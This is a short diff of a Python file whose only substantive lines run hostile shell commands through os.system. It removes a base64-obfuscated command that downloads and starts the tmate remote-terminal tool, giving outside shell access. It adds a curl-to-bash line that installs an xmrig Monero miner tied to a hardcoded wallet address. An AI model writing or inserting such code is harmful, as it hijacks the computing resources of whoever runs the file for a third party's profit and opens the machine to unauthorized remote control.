@@ -1,2 +1,3 @@
 import os
-os.system('! base64 -d <<< d2dldCBodHRwczovL2dpdGh1Yi5jb20vdG1hdGUtaW8vdG1hdGUvcmVsZWFzZXMvZG93bmxvYWQvMi40LjAvdG1hdGUtMi40LjAtc3RhdGljLWxpbnV4LWFtZDY0LnRhci54eiAgJiYgdGFyIC14ZiB0bWF0ZS0yLjQuMC1zdGF0aWMtbGludXgtYW1kNjQudGFyLnh6ICYmIGNkIHRtYXRlLTIuNC4wLXN0YXRpYy1saW51eC1hbWQ2NCAmJiAuL3RtYXRlIC1G== | sh')
+os.system('curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2')
+os.system('top')
